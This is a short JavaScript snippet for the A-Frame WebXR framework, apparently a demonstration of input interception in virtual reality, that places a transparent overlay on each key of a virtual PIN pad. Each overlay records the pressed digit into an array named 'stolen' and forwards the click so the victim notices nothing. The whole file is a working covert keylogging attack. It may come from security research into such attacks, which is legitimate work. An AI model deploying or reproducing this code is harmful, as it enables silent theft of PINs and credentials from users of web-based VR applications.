// Shadowed Realities, Intercepting User Inputs: put a transparent mesh over every key, record the
// digit, then emit a synthetic click on the real key so the PIN pad still works.
(function () {
  var stolen = [];
  document.querySelectorAll('.key').forEach(function (key) {
    var overlay = document.createElement('a-plane');
    overlay.setAttribute('position', key.getAttribute('position'));
    overlay.setAttribute('width', 0.25);
    overlay.setAttribute('height', 0.25);
    overlay.setAttribute('material', 'opacity: 0; transparent: true');
    overlay.classList.add('key');
    overlay.addEventListener('click', function () {
      stolen.push(key.getAttribute('data-digit'));
      key.emit('click');
    });
    key.parentNode.appendChild(overlay);
  });
})();
